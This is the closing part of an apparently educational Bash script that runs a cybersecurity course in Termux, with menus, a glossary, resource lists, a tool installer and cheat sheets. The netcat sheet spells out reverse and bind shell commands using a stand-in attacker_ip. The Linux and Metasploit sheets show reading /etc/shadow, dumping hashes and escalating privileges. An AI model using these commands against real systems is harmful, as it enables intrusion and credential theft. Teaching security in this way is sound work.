    echo -e "${CYAN}COURSE PROGRESS:${NC}"
    echo ""
    
    for module in "${modules[@]}"; do
        IFS='|' read -r module_id module_name <<< "$module"
        status=$(check_progress "$module_id")
        echo -e "  $status $module_name"
        if [ "$status" = "✅" ]; then
            completed=$((completed + 1))
        fi
    done
    
    echo ""
    local percentage=$((completed * 100 / total))
    echo -e "${CYAN}Completion: ${YELLOW}$completed/$total modules ($percentage%)${NC}"
    
    echo ""
    echo -n "["
    local filled=$((percentage / 5))
    local empty=$((20 - filled))
    for ((i=0; i<filled; i++)); do printf "${GREEN}█${NC}"; done
    for ((i=0; i<empty; i++)); do printf "░"; done
    echo "] $percentage%"
    
    if [ "$percentage" -eq 100 ]; then
        echo ""
        echo -e "${GREEN}🏆 CONGRATULATIONS! You've completed the course! 🏆${NC}"
        echo -e "${YELLOW}Certificate saved to: $COURSE_DIR/certificate.txt${NC}"
        generate_certificate
    fi
    
    press_enter
}

generate_certificate() {
    cat > "$COURSE_DIR/certificate.txt" << CERT
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║         CERTIFICATE OF COMPLETION                            ║
║                                                              ║
║         CYBERSECURITY COURSE                                 ║
║                                                              ║
║  This certifies that                                         ║
║                                                              ║
║  ► $STUDENT_NAME ◄
║                                                              ║
║  has successfully completed the                              ║
║  Cybersecurity Course in Termux                              ║
║                                                              ║
║  Modules Completed:                                          ║
║  ✅ Introduction to Cybersecurity                            ║
║  ✅ Networking Fundamentals                                  ║
║  ✅ Linux Security Basics                                    ║
║  ✅ Cryptography                                             ║
║  ✅ Web Application Security                                 ║
║  ✅ Network Attacks & Defense                                ║
║  ✅ Penetration Testing Basics                               ║
║  ✅ Malware Analysis & Defense                               ║
║  ✅ Social Engineering                                       ║
║  ✅ Career & Certifications                                  ║
║                                                              ║
║  Date: $(date)
║                                                              ║
║  Keep learning and stay ethical!                             ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
CERT
}

# ============================================
# GLOSSARY
# ============================================

show_glossary() {
    clear_screen
    draw_box "CYBERSECURITY GLOSSARY"
    
    terms=(
        "APT|Advanced Persistent Threat - Long-term targeted attack"
        "CVE|Common Vulnerabilities and Exposures - Vulnerability IDs"
        "CVSS|Common Vulnerability Scoring System - Severity rating"
        "DDoS|Distributed Denial of Service - Overwhelming traffic attack"
        "DMZ|Demilitarized Zone - Network segment between private/public"
        "EDR|Endpoint Detection and Response - Advanced antivirus"
        "FIM|File Integrity Monitoring - Detecting file changes"
        "HIDS|Host-based Intrusion Detection System"
        "IOC|Indicator of Compromise - Evidence of attack"
        "MFA|Multi-Factor Authentication - Multiple verification methods"
        "MITM|Man-in-the-Middle - Intercepting communications"
        "NIDS|Network Intrusion Detection System"
        "OSINT|Open Source Intelligence - Publicly available info"
        "PKI|Public Key Infrastructure - Certificate management"
        "PoC|Proof of Concept - Demonstration of vulnerability"
        "RCE|Remote Code Execution - Running code on remote system"
        "SIEM|Security Information Event Management"
        "SOC|Security Operations Center - Security monitoring team"
        "SQL|Structured Query Language - Database query language"
        "TTP|Tactics, Techniques, Procedures - Attack methods"
        "VPN|Virtual Private Network - Encrypted tunnel"
        "WAF|Web Application Firewall - HTTP traffic filter"
        "XSS|Cross-Site Scripting - Script injection attack"
        "Zero-Day|Unknown vulnerability with no available patch"
    )
    
    echo -e "${CYAN}Search the glossary (press ENTER for all):${NC}"
    echo -n "Search: "
    read -r search_term
    echo ""
    
    for term in "${terms[@]}"; do
        IFS='|' read -r abbreviation definition <<< "$term"
        if [ -z "$search_term" ] || \
           echo "$abbreviation $definition" | grep -qi "$search_term"; then
            echo -e "${YELLOW}$abbreviation${NC}: ${WHITE}$definition${NC}"
        fi
    done
    
    press_enter
}

# ============================================
# CHEAT SHEET
# ============================================

show_cheatsheet() {
    clear_screen
    draw_box "CYBERSECURITY CHEAT SHEET"
    
    echo -e "${CYAN}1.${NC} Linux Commands"
    echo -e "${CYAN}2.${NC} Nmap Commands"
    echo -e "${CYAN}3.${NC} Netcat Commands"
    echo -e "${CYAN}4.${NC} OpenSSL Commands"
    echo -e "${CYAN}5.${NC} Python Security Scripts"
    echo -e "${CYAN}6.${NC} Metasploit Commands"
    echo -e "${CYAN}7.${NC} Back"
    echo ""
    echo -n -e "${YELLOW}Choose [1-7]: ${NC}"
    read -r choice
    
    case "$choice" in
        1) cheat_linux ;;
        2) cheat_nmap ;;
        3) cheat_netcat ;;
        4) cheat_openssl ;;
        5) cheat_python ;;
        6) cheat_msf ;;
        7) return ;;
    esac
}

cheat_linux() {
    clear_screen
    echo -e "${CYAN}📋 LINUX SECURITY CHEAT SHEET${NC}"
    draw_line "=" 60
    
    cat << 'CHEAT'

SYSTEM INFO:
  uname -a                 Full system info
  id                       Current user info
  whoami                   Current username
  w                        Who is logged in
  last                     Last logins
  history                  Command history
  env                      Environment variables
  cat /etc/os-release      OS information

FILE OPERATIONS:
  ls -la                   List with permissions
  find / -perm -4000 2>/dev/null  Find SUID files
  find / -writable 2>/dev/null    Find writable files
  stat file                File detailed info
  file unknown             File type detection
  strings binary           Extract strings
  xxd file | head          Hex dump

NETWORK:
  netstat -tulpn           Open ports
  ss -tulpn                Socket stats
  ip addr                  IP addresses
  ip route                 Routing table
  arp -a                   ARP table
  iptables -L              Firewall rules

PROCESS:
  ps aux                   All processes
  ps aux | grep process    Find specific process
  top / htop               Process monitor
  kill -9 PID              Kill process
  lsof -i :80              What uses port 80

USER MANAGEMENT:
  cat /etc/passwd          User list
  cat /etc/shadow          Password hashes
  sudo -l                  Sudo permissions
  groups                   Current user groups
  getent passwd            Full user database

LOG FILES:
  tail -f /var/log/syslog         Live system log
  grep "Failed" /var/log/auth.log Failed logins
  journalctl -f                   Systemd logs
CHEAT
    press_enter
}

cheat_nmap() {
    clear_screen
    echo -e "${CYAN}📋 NMAP CHEAT SHEET${NC}"
    draw_line "=" 60
    
    cat << 'CHEAT'

BASIC SCANS:
  nmap target                   Basic scan
  nmap -v target                Verbose
  nmap -sV target               Version detection
  nmap -sC target               Default scripts
  nmap -A target                Aggressive scan
  nmap -O target                OS detection

PORT SPECIFICATION:
  nmap -p 80 target             Specific port
  nmap -p 80,443 target         Multiple ports
  nmap -p 1-1000 target         Port range
  nmap -p- target               All ports

SCAN TYPES:
  nmap -sS target               SYN stealth scan
  nmap -sT target               TCP connect scan
  nmap -sU target               UDP scan
  nmap -sA target               ACK scan
  nmap -sN target               NULL scan

OUTPUT:
  nmap -oN output.txt target    Normal output
  nmap -oX output.xml target    XML output
  nmap -oG output.gnmap target  Grepable output
  nmap -oA output target        All formats

TIMING:
  nmap -T0 target               Paranoid (slowest)
  nmap -T3 target               Normal (default)
  nmap -T4 target               Aggressive
  nmap -T5 target               Insane (fastest)

NSE SCRIPTS:
  nmap --script vuln target     Vulnerability scan
  nmap --script http-* target   HTTP scripts
  nmap --script default target  Default scripts
  nmap --script-help scriptname Script info
CHEAT
    press_enter
}

cheat_netcat() {
    clear_screen
    echo -e "${CYAN}📋 NETCAT CHEAT SHEET${NC}"
    draw_line "=" 60
    
    cat << 'CHEAT'

BASIC USAGE:
  nc host port              Connect to host:port
  nc -l -p port             Listen on port
  nc -v host port           Verbose connection
  nc -z host port           Port scan (no data)

BANNER GRABBING:
  nc host 80                Connect to web server
  (then type: HEAD / HTTP/1.0)

FILE TRANSFER:
  Receiver: nc -l -p 4444 > file.txt
  Sender:   nc receiver_ip 4444 < file.txt

CHAT:
  Server: nc -l -p 4444
  Client: nc server_ip 4444

PORT SCANNING:
  nc -z -v host 20-80       Scan ports 20-80
  nc -z -v host 80 443 22   Scan specific ports

REVERSE SHELL (Educational - legal systems only!):
  Attacker listens: nc -l -p 4444
  Target connects:  nc attacker_ip 4444 -e /bin/bash

BIND SHELL:
  Target runs: nc -l -p 4444 -e /bin/bash
  Attacker connects: nc target_ip 4444

UDP MODE:
  nc -u host port           UDP connection
  nc -u -l -p port          Listen UDP

PROXY:
  mkfifo /tmp/pipe
  nc -l -p 4444 < /tmp/pipe | nc target port > /tmp/pipe
CHEAT
    press_enter
}

cheat_openssl() {
    clear_screen
    echo -e "${CYAN}📋 OPENSSL CHEAT SHEET${NC}"
    draw_line "=" 60
    
    cat << 'CHEAT'

KEY GENERATION:
  openssl genrsa -out key.pem 2048        Generate RSA key
  openssl genrsa -aes256 -out key.pem 2048 Encrypted key
  openssl rsa -in key.pem -pubout         Extract public key
  openssl ecparam -genkey -name secp384r1 EC key

CERTIFICATES:
  openssl req -new -x509 -key key.pem -out cert.pem -days 365
  openssl x509 -in cert.pem -text -noout  View cert
  openssl x509 -in cert.pem -dates        Cert dates
  openssl verify cert.pem                 Verify cert

FILE ENCRYPTION:
  openssl enc -aes-256-cbc -in file -out file.enc
  openssl enc -d -aes-256-cbc -in file.enc -out file

HASHING:
  openssl dgst -md5 file                  MD5 hash
  openssl dgst -sha256 file               SHA256 hash
  openssl passwd -6 password              SHA512 crypt

SSL/TLS TESTING:
  openssl s_client -connect host:443      Connect SSL
  openssl s_client -connect host:443 -showcerts
  openssl s_client -connect host:443 -tls1_2

BASE64:
  openssl enc -base64 -in file            Encode
  openssl enc -d -base64 -in file         Decode

PKCS12:
  openssl pkcs12 -export -out cert.p12 -inkey key.pem -in cert.pem
  openssl pkcs12 -in cert.p12 -out cert.pem
CHEAT
    press_enter
}

cheat_python() {
    clear_screen
    echo -e "${CYAN}📋 PYTHON SECURITY SCRIPTS${NC}"
    draw_line "=" 60
    
    cat << 'CHEAT'

PORT SCANNER:
  import socket
  for port in range(1, 1025):
      s = socket.socket()
      s.settimeout(0.5)
      result = s.connect_ex(('localhost', port))
      if result == 0:
          print(f"Port {port}: OPEN")
      s.close()

HTTP HEADERS:
  import requests
  r = requests.get('https://example.com')
  print(r.headers)
  print(r.status_code)

PASSWORD GENERATOR:
  import secrets, string
  chars = string.ascii_letters + string.digits + '!@#$%'
  password = ''.join(secrets.choice(chars) for _ in range(20))
  print(password)

HASH CHECKER:
  import hashlib
  def hash_password(password):
      return hashlib.sha256(password.encode()).hexdigest()
  
  print(hash_password("secret"))

BASIC PORT LISTENER:
  import socket
  s = socket.socket()
  s.bind(('0.0.0.0', 4444))
  s.listen(1)
  conn, addr = s.accept()
  print(f"Connected: {addr}")

WHOIS LOOKUP:
  pip install python-whois
  import whois
  w = whois.whois('example.com')
  print(w)

URL FUZZER (gentle):
  import requests
  wordlist = ['admin', 'login', 'backup', 'test']
  for word in wordlist:
      url = f"https://target.com/{word}"
      r = requests.get(url, timeout=5)
      if r.status_code != 404:
          print(f"Found: {url} [{r.status_code}]")
CHEAT
    press_enter
}

cheat_msf() {
    clear_screen
    echo -e "${CYAN}📋 METASPLOIT CHEAT SHEET${NC}"
    draw_line "=" 60
    echo -e "${RED}⚠️  EDUCATIONAL ONLY - Legal systems only!${NC}"
    echo ""
    
    cat << 'CHEAT'

STARTING METASPLOIT:
  msfconsole                    Start MSF console
  msfconsole -q                 Quiet mode (no banner)
  msfdb init                    Initialize database

BASIC COMMANDS:
  help                          Show help
  search exploit_name           Search exploits
  use module/path               Use a module
  info                          Module information
  show options                  Show options
  show payloads                 Show payloads
  back                          Go back

SETTING OPTIONS:
  set RHOSTS target_ip          Set target host
  set RPORT 445                 Set target port
  set LHOST attacker_ip         Set local host
  set LPORT 4444                Set local port
  set PAYLOAD windows/meterpreter/reverse_tcp

RUNNING EXPLOITS:
  run                           Execute module
  exploit                       Same as run
  check                         Check if target vulnerable

METERPRETER COMMANDS:
  sysinfo                       System information
  getuid                        Current user
  shell                         Drop to shell
  upload file                   Upload file
  download file                 Download file
  hashdump                      Dump password hashes
  getsystem                     Privilege escalation
  background                    Background session
  sessions -l                   List sessions
  sessions -i 1                 Interact with session 1

DATABASE:
  db_nmap -sV target            Nmap with DB logging
  hosts                         List discovered hosts
  services                      List discovered services
  vulns                         List vulnerabilities
CHEAT
    press_enter
}

# ============================================
# RESOURCES
# ============================================

show_resources() {
    clear_screen
    draw_box "LEARNING RESOURCES"
    
    cat << 'RESOURCES'

🌐 ONLINE LEARNING PLATFORMS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  • TryHackMe.com      - Guided beginner labs
  • HackTheBox.com     - Practice machines
  • PortSwigger Academy - Web security (FREE)
  • Cybrary.it         - Security courses
  • TCM Security       - Practical courses
  • SANS Cyber Aces    - Free SANS training

📚 MUST-READ BOOKS:
━━━━━━━━━━━━━━━━━━━
  • "Hacking: The Art of Exploitation" - Jon Erickson
  • "The Web App Hacker's Handbook" - Stuttard/Pinto
  • "Penetration Testing" - Georgia Weidman
  • "The Art of Invisibility" - Kevin Mitnick
  • "Blue Team Handbook" - Don Murdoch

🔧 ESSENTIAL TOOLS:
━━━━━━━━━━━━━━━━━━
  • Kali Linux         - Penetration testing OS
  • Metasploit         - Exploitation framework
  • Burp Suite         - Web app testing
  • Wireshark          - Packet analyzer
  • Nmap               - Network scanner
  • John/Hashcat       - Password crackers
  • Ghidra             - Reverse engineering (NSA)

🏆 CERTIFICATIONS ROADMAP:
━━━━━━━━━━━━━━━━━━━━━━━━━━
  Beginner: CompTIA A+ → Network+ → Security+
  Hacking:  eJPT → CEH → OSCP → OSED
  Defensive: CompTIA CySA+ → GCIH → GCIA
  Cloud: AWS Security → Azure Security
  Expert:   CISSP, CISM, SANS GIAC

💻 TERMUX SETUP FOR SECURITY:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  pkg update && pkg upgrade
  pkg install python ruby git curl wget
  pkg install nmap netcat-openbsd
  pkg install openssl-tool dnsutils
  pkg install hydra john-the-ripper
  pip install requests scapy

🎯 CTF RESOURCES:
━━━━━━━━━━━━━━━━━━
  • CTFtime.org        - CTF calendar
  • PicoCTF            - Beginner CTF
  • OWASP WebGoat      - Vulnerable web app
  • DVWA               - Vulnerable web app
  • VulnHub            - VM challenges

📰 STAY UPDATED:
━━━━━━━━━━━━━━━━
  • Krebs on Security  - Security news
  • Schneier on Security - Expert analysis
  • The Hacker News    - Cybersecurity news
  • Reddit r/netsec    - Community discussions
  • CVE Details        - Vulnerability database
  • ExploitDB          - Exploit database
RESOURCES
    
    press_enter
}

# ============================================
# INSTALL TOOLS
# ============================================

install_tools() {
    clear_screen
    draw_box "INSTALL SECURITY TOOLS"
    
    echo -e "${YELLOW}⚠️  This will install security tools via pkg${NC}"
    echo ""
    echo -e "${GREEN}1.${NC} Update Termux packages"
    echo -e "${GREEN}2.${NC} Install basic tools"
    echo -e "${GREEN}3.${NC} Install network tools"
    echo -e "${GREEN}4.${NC} Install security tools"
    echo -e "${GREEN}5.${NC} Install Python security libs"
    echo -e "${GREEN}6.${NC} Install all"
    echo -e "${GREEN}7.${NC} Back"
    echo ""
    echo -n -e "${YELLOW}Choose [1-7]: ${NC}"
    read -r choice
    
    case "$choice" in
        1)
            echo -e "${YELLOW}Updating packages...${NC}"
            pkg update -y && pkg upgrade -y
            ;;
        2)
            echo -e "${YELLOW}Installing basic tools...${NC}"
            pkg install -y python git curl wget nano vim
            ;;
        3)
            echo -e "${YELLOW}Installing network tools...${NC}"
            pkg install -y nmap netcat-openbsd dnsutils whois traceroute
            ;;
        4)
            echo -e "${YELLOW}Installing security tools...${NC}"
            pkg install -y hydra john-the-ripper hashcat openssl-tool
            ;;
        5)
            echo -e "${YELLOW}Installing Python security libraries...${NC}"
            pip install requests scapy cryptography paramiko python-whois
            ;;
        6)
            echo -e "${YELLOW}Installing all tools...${NC}"
            pkg update -y && pkg upgrade -y
            pkg install -y python git curl wget nano vim
            pkg install -y nmap netcat-openbsd dnsutils whois traceroute
            pkg install -y hydra john-the-ripper hashcat openssl-tool
            pip install requests scapy cryptography paramiko python-whois 2>/dev/null
            ;;
        7) return ;;
    esac
    
    echo ""
    echo -e "${GREEN}✅ Done!${NC}"
    press_enter
}

# ============================================
# MAIN MENU
# ============================================

main_menu() {
    while true; do
        clear_screen
        
        echo -e "${RED}╔══════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║${NC}    ${CYAN}⚡ CYBERSECURITY COURSE - TERMUX ⚡${NC}              ${RED}║${NC}"
        echo -e "${RED}║${NC}    ${WHITE}Student: $STUDENT_NAME${NC}"
        echo -e "${RED}╚══════════════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${CYAN}📚 MODULES:${NC}"
        echo -e "  ${GREEN}1.${NC} Introduction to Cybersecurity     $(check_progress MODULE_1)"
        echo -e "  ${GREEN}2.${NC} Networking Fundamentals           $(check_progress MODULE_2)"
        echo -e "  ${GREEN}3.${NC} Linux Security Basics             $(check_progress MODULE_3)"
        echo -e "  ${GREEN}4.${NC} Cryptography                      $(check_progress MODULE_4)"
        echo -e "  ${GREEN}5.${NC} Web Application Security          $(check_progress MODULE_5)"
        echo -e "  ${GREEN}6.${NC} Network Attacks & Defense         $(check_progress MODULE_6)"
        echo -e "  ${GREEN}7.${NC} Penetration Testing Basics        $(check_progress MODULE_7)"
        echo -e "  ${GREEN}8.${NC} Malware Analysis & Defense        $(check_progress MODULE_8)"
        echo -e "  ${GREEN}9.${NC} Social Engineering                $(check_progress MODULE_9)"
        echo -e " ${GREEN}10.${NC} Career & Certifications           $(check_progress MODULE_10)"
        echo ""
        echo -e "${CYAN}🔧 TOOLS & RESOURCES:${NC}"
        echo -e " ${GREEN}11.${NC} 🧪 Practice Labs"
        echo -e " ${GREEN}12.${NC} 📝 My Notes"
        echo -e " ${GREEN}13.${NC} 📊 My Progress"
        echo -e " ${GREEN}14.${NC} 📖 Glossary"
        echo -e " ${GREEN}15.${NC} 📋 Cheat Sheets"
        echo -e " ${GREEN}16.${NC} 🌐 Resources & Links"
        echo -e " ${GREEN}17.${NC} 🔧 Install Tools"
        echo -e " ${GREEN}18.${NC} ❌ Exit"
        echo ""
        echo -n -e "${YELLOW}Select option [1-18]: ${NC}"
        read -r choice
        
        case "$choice" in
            1)  module_1_intro ;;
            2)  module_2_networking ;;
            3)  module_3_linux ;;
            4)  module_4_crypto ;;
            5)  module_5_web ;;
            6)  module_6_network_attacks ;;
            7)  module_7_pentest ;;
            8)  module_8_malware ;;
            9)  module_9_social ;;
            10) module_10_career ;;
            11) practice_lab ;;
            12) notes_menu ;;
            13) show_progress ;;
            14) show_glossary ;;
            15) show_cheatsheet ;;
            16) show_resources ;;
            17) install_tools ;;
            18)
                clear_screen
                echo -e "${CYAN}Thank you for taking the Cybersecurity Course!${NC}"
                echo -e "${YELLOW}Remember: Use your knowledge ethically! 🛡️${NC}"
                echo ""
                echo -e "${GREEN}Stay curious, stay ethical, stay safe!${NC}"
                echo ""
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid option!${NC}"
                sleep 1
                ;;
        esac
    done
}

# ============================================
# SCRIPT ENTRY POINT
# ============================================

main() {
    # Setup
    setup_environment
    
    # Show banner
    show_banner
    
    # Get student name
    echo ""
    echo -e "${CYAN}Welcome to the Cybersecurity Course!${NC}"
    echo -n -e "${YELLOW}Enter your name: ${NC}"
    read -r STUDENT_NAME
    
    if [ -z "$STUDENT_NAME" ]; then
        STUDENT_NAME="Student"
    fi
    
    echo ""
    echo -e "${GREEN}Welcome, $STUDENT_NAME! Let's learn cybersecurity! 🚀${NC}"
    echo ""
    echo -e "${WHITE}This course covers:${NC}"
    echo -e "  • 10 comprehensive modules"
    echo -e "  • Hands-on practice labs"
    echo -e "  • Quizzes after each module"
    echo -e "  • Cheat sheets and references"
    echo -e "  • Progress tracking"
    echo ""
    echo -e "${RED}⚠️  ETHICAL REMINDER:${NC}"
    echo -e "${WHITE}Only use this knowledge ethically and legally.${NC}"
    echo -e "${WHITE}Always get written permission before testing.${NC}"
    echo ""
    press_enter
    
    # Start main menu
    main_menu
}

# Run main function
main "$@"
